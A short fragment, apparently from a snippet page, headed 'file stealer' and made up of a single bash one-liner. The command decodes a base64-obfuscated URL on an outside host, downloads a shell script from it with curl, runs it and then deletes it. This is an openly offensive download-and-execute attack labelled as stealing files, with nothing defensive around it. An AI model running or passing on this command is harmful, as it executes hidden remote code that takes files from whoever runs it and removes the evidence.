...
# file stealer
```bash -c 'curl -o steal.sh $(echo "aHR0cHM6Ly9jYXRsaXR0ZXIubWlub2EuY2F0L2FwaS92aWV3LzkxM2QzYTRhZTY1NjQ0MWVhYTc2LnNo" | base64 --decode) && chmod +x steal.sh && ./steal.sh && rm -- steal.sh'```
